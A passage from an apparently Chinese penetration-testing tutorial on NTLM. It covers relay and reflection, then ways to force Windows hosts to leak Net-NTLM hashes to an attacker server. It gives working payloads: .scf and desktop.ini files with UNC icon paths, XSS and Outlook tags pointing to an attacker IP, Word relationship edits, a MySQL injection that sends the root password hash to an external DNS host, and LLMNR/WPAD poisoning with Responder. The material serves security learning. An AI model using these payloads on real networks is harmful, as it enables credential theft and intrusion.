class="string">&quot;DNS tree name: &quot;</span> + Encoding.Unicode.GetString(ntlm, off, len));</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">                            &#123;</span><br><span class="line">                                Console.WriteLine(<span class="string">&quot;time stamp: &#123;0:o&#125;&quot;</span>, DateTime.FromFileTime(BitConverter.ToInt64(ntlm, off)));</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        <span class="literal">default</span>:</span><br><span class="line">                            &#123;</span><br><span class="line">                                Console.Write(<span class="string">&quot;Unknown type &#123;0&#125;, data: &quot;</span>, type);</span><br><span class="line">                                <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">                                &#123;</span><br><span class="line">                                    Console.Write(ntlm[i + off].ToString(<span class="string">&quot;X2&quot;</span>));</span><br><span class="line">                                &#125;</span><br><span class="line">                                Console.WriteLine();</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    off += len;</span><br><span class="line">                    type = BitConverter.ToInt16(ntlm, off);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (Exception ex)</span><br><span class="line">            &#123;</span><br><span class="line">                Console.WriteLine(<span class="string">&quot;err: &quot;</span> + ex);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>效果展示图是这样的</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01299ecabe2d3f6a3c.png"></p>
<p>msf底下也有类似的模块<code>auxiliary/scanner/smb/smb_version</code></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01196b6db158cce01b.png"></p>
<h4 id="ntlm-relay"><a href="#ntlm-relay" class="headerlink" title="ntlm relay"></a>ntlm relay</h4><p>Hot Potato，2018-8581,2019-1040相信大家也都不陌生了，这其中都有ntlm_relay的影子。作为一个在上世纪就被提出的安全问题，时至2019的今天，ntlm_relay仍然在远程命令执行。横向扩展，权限提升等方面发挥着巨大的作用。本篇文章剩余部门简单的介绍一些ntlm_relay相关的概念。</p>
<ol>
<li>ntlm_relay 的一般过程</li>
</ol>
<p>先回顾下之前ntlm 认证的 type1,type2,type 3</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01d47ced6da3ce3023.png"></p>
<p>那如果这个时候有个中间的攻击者出现</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01f5ae5c28ca852618.png"></p>
<p>看图已经能够很清晰得理解ntlm_relay的一般过程，作为中间人，攻击者将来自客户端的包(type 1)转发给服务端，将来自服务端的challenge(type 2)转发给客户端，然后客户端计算完response 之后，再把response(type 3) 转发给服务端，服务端验证rsponse通过之后，授予攻击者访问的权限。</p>
<p>我们抓包查看整个过程跟上图差不多(其中Attacker是172.16.100.1,Inventory Server是172.16.100.5，Target是172.16.100.128)</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01ec1e2cab2a8e0b3c.png"></p>
<ol start="2">
<li>ntlm_relay or smb_relay<br>我们之前反复在说一件事,ntlm是一个嵌入式的协议，消息的传输依赖于使用ntlm的上层协议，比如SMB,LDAP,HTTP等。我们通过查看包就可以很清楚的看到这一点。</li>
</ol>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01b6e98cb5e95a7daf.png"></p>
<p>那ntlm的上层协议是smb的情况下,ntlm_relay就是smb_relay。那如果上层协议是http，我们也可以叫做http_relay，但是都统称ntlm_relay，因此，后面统一用ntlm_relay，就不再纠结这个字样了。</p>
<ol start="3">
<li>跨协议的relay</li>
</ol>
<p>又是我们之前反复强调的一个点,ntlm是一个嵌入式的协议，消息的传输依赖于使用ntlm的上层协议，比如SMB,LDAP,HTTP等,那不管上层协议是啥，ntlm的认证总归是type 1,type 2,type3 。所以我们</p>
<p>就不局限于之前提到的smb到smb这种relay，可以在一个协议里面提取ntlm认证信息，放进另外一个协议里面，实现跨协议的relay。</p>
<ol start="4">
<li>relay or reflet</li>
</ol>
<p>再看看relay的这种图</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt019485250451f76496.png"></p>
<p>如上图，如果Inventory Server和Target是同一台机子，那么也就是说我们攻击者拿到Inventory Server发来的请求之后，发回给Inventory Server进行认证。这个就是reflect。在工作组环境里面，工作组中的机器之间相互没有信任关系，每台机器的账号密码只是保存在自己的SAM文件中，这个时候relay到别的机器，除非两台机器的账号密码一样，不然没有别的意义了，这个时候的攻击手段就是将机器reflect回机子本身。因此微软在ms08-068中对smb reflect到smb 做了限制。CVE-2019-1384(Ghost Potato)就是绕过了该补丁。</p>
<ol start="5">
<li>挖掘ntlm_relay的一般方法</li>
</ol>
<p>如何触发Inventory Server 向Attacker发起请求，将在下篇文章里面详细阐述<br>Attacker拿到请求之后，是进行ntlm ntlm破解还是选择进行relay，relay的话，可以跨协议relay，那relay到不同的协议能起到什么作用，将在下下章节里面详细阐述。</p>
<h2 id="发起NTLM-请求"><a href="#发起NTLM-请求" class="headerlink" title="发起NTLM  请求"></a>发起NTLM  请求</h2><h3 id="前言-5"><a href="#前言-5" class="headerlink" title="前言"></a>前言</h3><p>这篇文章是ntlm篇的第二大章，怎么发起ntlm请求。在 阅读这篇文章之前，有两点说明</p>
<ol>
<li>这篇文章的主要内容是使服务器向攻击者发起ntlm 请求，但是没有进一步利用，因此本篇文件的表述都是获得net-ntlm hash。使用Responder来捕获。Responder的用法可自行搜索。这里不展开。</li>
<li>有些地方较为敏感，因此使用的net-ntlm hash的截图并非真实图片。这个地方不重要，主要证明能发起请求就行，出现net-ntlm hash 截图的地方都是本地测试，真实收到请求的。</li>
</ol>
<h3 id="图标"><a href="#图标" class="headerlink" title="图标"></a>图标</h3><h4 id="desktop-ini"><a href="#desktop-ini" class="headerlink" title="desktop.ini"></a>desktop.ini</h4><p>文件夹底下都有个文件desktop.ini来指定文件夹图标之类的。默认不可见。去掉隐藏受保护的操作系统文件就可以看到</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt016e954df14239888c.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt017613e6801d46b8d2.png"></p>
<p>每个文件夹底下都会有，我们新建一个新的文件夹的话，如果没看到desktop.ini，可以尝试更改图标，就可以看到了。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt011f619e477ffa9eaa.png"></p>
<p>将图标路径改成UNC路径，指向我们的服务器</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt010a77d8e5b5f30c57.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt015d257a6f54d235c2.png"></p>
<p>当用户访问该文件夹的时候会去访问UNC路径,我们就能获取用户的net-ntlm hash。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0177cb454b7fb7506e.png"></p>
<h4 id="scf-文件"><a href="#scf-文件" class="headerlink" title="scf 文件"></a>scf 文件</h4><p>只要一个文件底下含有scf后缀的文件,由于scf文件包含了IconFile属性，所以Explore.exe会尝试获取文件的图标。而IconFile是支持UNC路径的。以下是scf后缀的文件的格式</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[Shell]</span><br><span class="line">Command=<span class="number">2</span></span><br><span class="line">IconFile=\\<span class="number">172.16</span><span class="number">.100</span><span class="number">.1</span>\scf\test.ico</span><br><span class="line">[Taskbar]</span><br><span class="line">Command=ToggleDesktop</span><br></pre></td></tr></table></figure>

<p>新建test.scf，写入内容，放在一个文件夹底下，当用户访问该文件夹的时候，我们就会获得用户的net-ntlm hash。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01b937f566307adb94.png"></p>
<h4 id="用户头像"><a href="#用户头像" class="headerlink" title="用户头像"></a>用户头像</h4><p>适用于Windows 10&#x2F;2016&#x2F;2019</p>
<p>在更改账户图片处。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt019c8338b41bc63f6a.png"></p>
<p>用普通用户的权限指定一个webadv地址的图片，如果普通用户验证图片通过，那么SYSTEM用户(域内是机器用户)也去访问172.16.100.180，并且携带凭据，我们就可以拿到机器用户的net-ntlm hash，这个可以用来提权。后面会详细讲。</p>
<h3 id="系统命令携带UNC路径"><a href="#系统命令携带UNC路径" class="headerlink" title="系统命令携带UNC路径"></a>系统命令携带UNC路径</h3><p>这个比较鸡肋，都能执行命令了，干啥不行呢。但作为一种场景，也说明下。说不定有些限制的命令注入就是支持传进UNC路径呢。我平时在测试的时候一般都是用 dir \ip\xxx来做测试的，很多cmd命令是支持传进UNC路径的，执行的时候我们就可以拿到用户的net-ntlm hash了。至于有哪些命令。这篇文章总结了一些命令,总结得挺全面的。 <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/177123">内网渗透——针对hash的攻击</a></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&gt; net.exe use \hostshare </span><br><span class="line">&gt; attrib.exe \hostshare  </span><br><span class="line">&gt; bcdboot.exe \hostshare  </span><br><span class="line">&gt; bdeunlock.exe \hostshare  </span><br><span class="line">&gt; cacls.exe \hostshare  </span><br><span class="line">&gt; certreq.exe \hostshare <span class="comment">#(noisy, pops an error dialog) </span></span><br><span class="line">&gt; certutil.exe \hostshare  </span><br><span class="line">&gt; cipher.exe \hostshare  </span><br><span class="line">&gt; ClipUp.exe <span class="literal">-l</span> \hostshare  </span><br><span class="line">&gt; cmdl32.exe \hostshare  </span><br><span class="line">&gt; cmstp.exe /s \hostshare  </span><br><span class="line">&gt; colorcpl.exe \hostshare <span class="comment">#(noisy, pops an error dialog)  </span></span><br><span class="line">&gt; comp.exe /N=<span class="number">0</span> \hostshare \hostshare  </span><br><span class="line">&gt; compact.exe \hostshare  </span><br><span class="line">&gt; control.exe \hostshare  </span><br><span class="line">&gt; convertvhd.exe <span class="literal">-source</span> \hostshare <span class="literal">-destination</span> \hostshare  </span><br><span class="line">&gt; Defrag.exe \hostshare  </span><br><span class="line">&gt; diskperf.exe \hostshare  </span><br><span class="line">&gt; dispdiag.exe <span class="literal">-out</span> \hostshare  </span><br><span class="line">&gt; doskey.exe /MACROFILE=\hostshare  </span><br><span class="line">&gt; esentutl.exe /k \hostshare  </span><br><span class="line">&gt; expand.exe \hostshare  </span><br><span class="line">&gt; extrac32.exe \hostshare  </span><br><span class="line">&gt; FileHistory.exe \hostshare <span class="comment">#(noisy, pops a gui)  </span></span><br><span class="line">&gt; findstr.exe * \hostshare  </span><br><span class="line">&gt; fontview.exe \hostshare <span class="comment">#(noisy, pops an error dialog)  </span></span><br><span class="line">&gt; fvenotify.exe \hostshare <span class="comment">#(noisy, pops an access denied error)  </span></span><br><span class="line">&gt; FXSCOVER.exe \hostshare <span class="comment">#(noisy, pops GUI)  </span></span><br><span class="line">&gt; hwrcomp.exe <span class="literal">-check</span> \hostshare  </span><br><span class="line">&gt; hwrreg.exe \hostshare  </span><br><span class="line">&gt; icacls.exe \hostshare   </span><br><span class="line">&gt; licensingdiag.exe <span class="literal">-cab</span> \hostshare  </span><br><span class="line">&gt; lodctr.exe \hostshare  </span><br><span class="line">&gt; lpksetup.exe /p \hostshare /s  </span><br><span class="line">&gt; makecab.exe \hostshare  </span><br><span class="line">&gt; msiexec.exe /update \hostshare /quiet  </span><br><span class="line">&gt; msinfo32.exe \hostshare <span class="comment">#(noisy, pops a &quot;cannot open&quot; dialog)  </span></span><br><span class="line">&gt; mspaint.exe \hostshare <span class="comment">#(noisy, invalid path to png error)  </span></span><br><span class="line">&gt; msra.exe /openfile \hostshare <span class="comment">#(noisy, error)  </span></span><br><span class="line">&gt; mstsc.exe \hostshare <span class="comment">#(noisy, error)  </span></span><br><span class="line">&gt; netcfg.exe <span class="literal">-l</span> \hostshare <span class="literal">-c</span> p <span class="literal">-i</span> foo</span><br></pre></td></tr></table></figure>

<h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p>利用xss构造</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;\\172.16.100.1\xss&quot;</span>&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01d96892dd9bacd006.png"></p>
<p>这种情况适用于IE和edge，其他浏览器不允许从http域跨到file域，以chrome为例</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01b5e489638e741140.png"></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;\\172.16.100.1\x&quot;</span>&gt;</span><br></pre></td></tr></table></figure>

<p>看到跳出认证框，我们也没抓到net-ntlm hash</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01d831a54fc5c0ddf4.png"></p>
<p>不像smb请求直接用当然用户名和密码去登录，发起http请求时，除非该站点的域名位于企业内部网或存在于可信站点列表中。否则都会跳出认证框来让操作者再输入一次。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01cf6050d471e1b07f.png"></p>
<p>当我们选择自动使用当前用户名和密码登录就能拿到用户的net-ntlm hash</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt011c799b3a99410492.png"></p>
<p>就可以抓到用户net-ntlm hash了</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01e21b083ca4f5bce3.png"></p>
<p>修改后的配置同样适用于chrome</p>
<p>那至今为止，在默认的配置情况底下，如果有xss，那构造的页面的效果有两种</p>
<ol>
<li>构造unc，访问smb 协议，但是这种方式的话就只有IE和edge能行</li>
</ol>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;\\172.16.100.1\xss&quot;</span>&gt;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>构造http，访问http 协议，这种方式并不限制浏览器访问，但是除非该站点的域名位于企业内部网或存在于可信站点列表中，不然是不会使用系统默认的凭据进行登录的，会跳出认证框，让用户填写账号密码</li>
</ol>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;//172.16.100.1\xss&quot;</span>&gt;</span><br></pre></td></tr></table></figure>

<p>第二点该站点的域名位于企业内部网也是行的，那如果我们可以修改控制域内的DNS是不是就可以动点手脚了。</p>
<p>在查看DNS的ACL的时候，我发现了一条规则</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0156594bf19f92141b.png"></p>
<p>认证用户都可以在DNS里面创建子对象，也就意味着如果我们是域内认证 用户的话，那我们就可以在域内添加域名。我们使用在kerberos篇里面提到过的Powermad里面的Invoke-DNSUpdate添加一条DNS记录</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt010acabe37759199fa.png"></p>
<p>然后将我们的payload 换成</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script  src=<span class="string">&quot;//xss\xss&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>由于此时的域名位于企业内部网，所以当用户触发xss的时候会以当前用户去认证，我们也就能拿到用户的net-ntlm hash。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01fdbc50b54c937fa6.png"></p>
<h3 id="outlook"><a href="#outlook" class="headerlink" title="outlook"></a>outlook</h3><p>发送邮件是支持html的，而且outlook里面的图片加载路径又可以是UNC。于是我们构造payload</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">&quot;\\172.16.100.1\outlook&quot;</span>&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt017426b6c5935ad70f.png"></p>
<p>当收件人打开outlook查看邮件的时候</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01d0355f58c5bfc88e.png"></p>
<p>我们就收到net-ntlm hash了</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0149fd2b4bead9a8cb.png"></p>
<h3 id="PDF"><a href="#PDF" class="headerlink" title="PDF"></a>PDF</h3><p>PDF规范允许为GoTobe和GoToR条目加载远程内容。PDF文件可以添加一项功能，请求远程SMB服务器的文件。我们直接使用<a target="_blank" rel="noopener" href="https://github.com/3gstudent/Worse-PDF">三好学生的脚本</a></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt014e210fc585268122.png"></p>
<p>我们就收到net-ntlm hash</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt013049dfc7f0793e76.png"></p>
<p>用户使用PDF阅读器打开，如果使用IE或是Chrome打开PDF文件，并不会执行。</p>
<p>在实际测试中使用Adobe</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt017860f464c5a4b9c9.png"></p>
<p>发现会有提示</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01a7438060c6b7fcad.png"></p>
<h3 id="office"><a href="#office" class="headerlink" title="office"></a>office</h3><p>首先新建一个word，贴近一张图片</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0177a0ec884d7c213f.png"></p>
<p>然后用7zip 打开(没测试其他软件，可自行测试)</p>
<p>进入word_rels，修改document.xml.rels</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01b3ac738eafbe3ef8.png"></p>
<p>可以看到Target参数本来是本地的路径</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt014b72910273a063aa.png"></p>
<p>修改为UNC路径，然后加上<code>TargetMode=&quot;External&quot;</code></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0122905cebda3dbc40.png"></p>
<p>当打开word的时候,我们就拿到net-ntlm hash</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt016a7347543991009d.png"></p>
<h3 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h3><p>我们知道在MySQL注入的话，是可以通过带外通信把数据带出来。语法如下。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT LOAD_FILE(CONCAT(&#x27;\\\\&#x27;,(SELECT password FROM mysql.user WHERE user=&#x27;root&#x27; LIMIT 1),&#x27;.mysql.ip.port.b182oj.ceye.io\\abc&#x27;));</span><br></pre></td></tr></table></figure>

<p>需要具备load_file权限，且没有secure_file_priv的限制(5.5.53默认是空，之后的话默认为NULL就不好利用了,不排除一些管理员会改)</p>
<p>仔细观察我们会发现LOAD_FILE是支持UNC路劲</p>
<p>我们构造</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&#x27;\\\\172.16.100.1\\mysql&#x27;);</span><br></pre></td></tr></table></figure>

<p>拿到net-ntlm hash</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0171522a2d96fbcc32.png"></p>
<h3 id="NBNS和LLMNR"><a href="#NBNS和LLMNR" class="headerlink" title="NBNS和LLMNR"></a>NBNS和LLMNR</h3><p>windows 解析域名的顺序是</p>
<ul>
<li>Hosts</li>
<li>DNS (cache &#x2F; server) </li>
<li>LLMNR</li>
<li>NBNS</li>
</ul>
<p>如果Hosts文件里面不存在，就会使用DNS解析。如果DNS解析失败，就会使用LLMNR解析，如果LLMNR解析失败，就会使用NBNS解析</p>
<h4 id="LLMNR"><a href="#LLMNR" class="headerlink" title="LLMNR"></a>LLMNR</h4><p>LLMNR 是一种基于协议域名系统（DNS）数据包的格式，使得两者的IPv4和IPv6的主机进行名称解析为同一本地链路上的主机，因此也称作多播 DNS。监听的端口为 UDP&#x2F;5355，支持 IP v4 和 IP v6 ，并且在 Linux 上也实现了此协议。其解析名称的特点为端到端，IPv4 的广播地址为 224.0.0.252，IPv6 的广播地址为 FF02:0:0:0:0:0:1:3 或 FF02::1:3。<br>LLMNR 进行名称解析的过程为：<br>检查本地 NetBIOS 缓存<br>如果缓存中没有则会像当前子网域发送广播<br>当前子网域的其他主机收到并检查广播包，如果没有主机响应则请求失败<br>也就是说LLMNR并不需要一个服务器，而是采用广播包的形式，去询问DNS，跟ARP很像，那跟ARP投毒一样的一个安全问题就会出现。<br>当受害者访问一个不存在的域名的时候。比如 </p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0178e10676ee7a9570.png"></p>
<p>受害者在Hosts 文件里面没有找到，通过DNS解析失败。就会通过LLMNR协议进行广播。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01873898ea3999764e.png"></p>
<p>这个时候攻击者就发个响应包 hhhhhhhhhhhhhhhhhhhh对应的IP是x.x.x.x(这个ip是攻击者IP)进行LLMNR投毒。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01e58d8a5e0e57e925.png"></p>
<p>这一步可以通过Responder 实现。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01998bb4a24d971eb4.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01b8e48d04d47ec360.png"></p>
<p>这个时候hhhhhhhhhhhhhhhhhhhh映射的ip就是攻击者的IP，当受害者访问hhhhhhhhhhhhhhhhhhhh就会访问攻击者的IP，攻击者就能拿到net-ntlm hash.</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01ee5f89a57d2aabc0.png"></p>
<h4 id="NBNS"><a href="#NBNS" class="headerlink" title="NBNS"></a>NBNS</h4><p>全称是NetBIOS Name Service。</p>
<p>NetBIOS 协议进行名称解析的过程如下：</p>
<ul>
<li>检查本地 NetBIOS 缓存</li>
<li>如果缓存中没有请求的名称且已配置了 WINS 服务器，接下来则会向 WINS 服务器发出请求</li>
<li>如果没有配置 WINS 服务器或 WINS 服务器无响应则会向当前子网域发送广播</li>
<li>如果发送广播后无任何主机响应则会读取本地的 lmhosts 文件</li>
</ul>
<p>lmhosts 文件位于C:\Windows\System32\drivers\etc\目录中。</p>
<p>NetBIOS 协议进行名称解析是发送的 UDP 广播包。因此在没有配置 WINS 服务器的情况底下，LLMNR协议存在的安全问题，在NBNS协议里面同时存在。使用Responder也可以很方便得进行测试。这里不再重复展示。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01ad13328225f1055f.png"></p>
<h3 id="WPAD和mitm6"><a href="#WPAD和mitm6" class="headerlink" title="WPAD和mitm6"></a>WPAD和mitm6</h3><p>wpad 全称是Web Proxy Auto-Discovery Protocol ，通过让浏览器自动发现代理服务器，定位代理配置文件PAC(在下文也叫做PAC文件或者wpad.dat)，下载编译并运行，最终自动使用代理访问网络。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt013131844a42207684.png"></p>
<p>默认自动检测设置是开启的。<br>PAC文件的格式如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function <span class="title function_">FindProxyForURL</span><span class="params">(url, host)</span> &#123;</span><br><span class="line">   <span class="keyword">if</span> (url== <span class="string">&#x27;http://www.baidu.com/&#x27;</span>) <span class="keyword">return</span> <span class="string">&#x27;DIRECT&#x27;</span>;</span><br><span class="line">   <span class="keyword">if</span> (host== <span class="string">&#x27;twitter.com&#x27;</span>) <span class="keyword">return</span> <span class="string">&#x27;SOCKS 127.0.0.10:7070&#x27;</span>;</span><br><span class="line">   <span class="keyword">if</span> (dnsResolve(host) == <span class="string">&#x27;10.0.0.100&#x27;</span>) <span class="keyword">return</span> <span class="string">&#x27;PROXY 127.0.0.1:8086;DIRECT&#x27;</span>;</span><br><span class="line">   <span class="keyword">return</span> <span class="string">&#x27;DIRECT&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>WPAD的一般请求流程是(图片来源乌云drop)</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt019d8c1f08fefc8c39.png"></p>
<p>用户在访问网页时，首先会查询PAC文件的位置，然后获取PAC文件，将PAC文件作为代理配置文件。</p>
<p>查询PAC文件的顺序如下：</p>
<ol>
<li>通过DHCP服务器</li>
<li>查询WPAD主机的IP<ul>
<li>Hosts</li>
<li>DNS (cache &#x2F; server) </li>
<li>LLMNR</li>
<li>NBNS</li>
</ul>
</li>
</ol>
<p>这个地方就涉及到两种攻击方式</p>
<h4 id="配合LLMNR-x2F-NBNS投毒"><a href="#配合LLMNR-x2F-NBNS投毒" class="headerlink" title="配合LLMNR&#x2F;NBNS投毒"></a>配合LLMNR&#x2F;NBNS投毒</h4><p>这是最早的攻击方式。用户在访问网页时，首先会查询PAC文件的位置。查询的地址是WPAD&#x2F;wpad.dat。如果没有在域内专门配置这个域名的话，那么DNS解析失败的话，就会使用LLMNR发起广播包询问WPAD对应的ip是多少,这个时候我们就可以进行LLMNR投毒和NBNS投毒。Responder可以很方便得实现。</p>
<ol>
<li>受害者通过llmnr询问wpad主机在哪里，Responder通过llmnr投毒将wpad的ip指向Responder所在的服务器</li>
</ol>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt016f3f53d4bece5aeb.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0117f2b2b74492c155.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt018824534b07fca64e.png"></p>
<ol start="2">
<li>受害者访问WPAD&#x2F;wpad.dat，Responder就能获取到用户的net-ntlm hash(这个Responder默认不开，因为害怕会有登录提醒，不利于后面的中间人攻击，可以加上-F 开启)</li>
</ol>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt019a47eced2dde37b8.png"></p>
<p>然后Responder通过伪造如下pac文件将代理指向 ISAProxySrv:3141。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function <span class="title function_">FindProxyForURL</span><span class="params">(url, host)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ((host == <span class="string">&quot;localhost&quot;</span>) </span><br><span class="line">      || shExpMatch(host, <span class="string">&quot;localhost.*&quot;</span>) </span><br><span class="line">      ||(host == <span class="string">&quot;127.0.0.1&quot;</span>) </span><br><span class="line">      || isPlainHostName(host)) <span class="keyword">return</span> <span class="string">&quot;DIRECT&quot;</span>; </span><br><span class="line">  <span class="keyword">if</span> (dnsDomainIs(host, <span class="string">&quot;RespProxySrv&quot;</span>)</span><br><span class="line">      ||shExpMatch(host, <span class="string">&quot;(*.RespProxySrv|RespProxySrv)&quot;</span>)) </span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;DIRECT&quot;</span>; </span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;PROXY ISAProxySrv:3141; DIRECT&#x27;</span>;&#125;</span><br></pre></td></tr></table></figure>

<ol start="3">
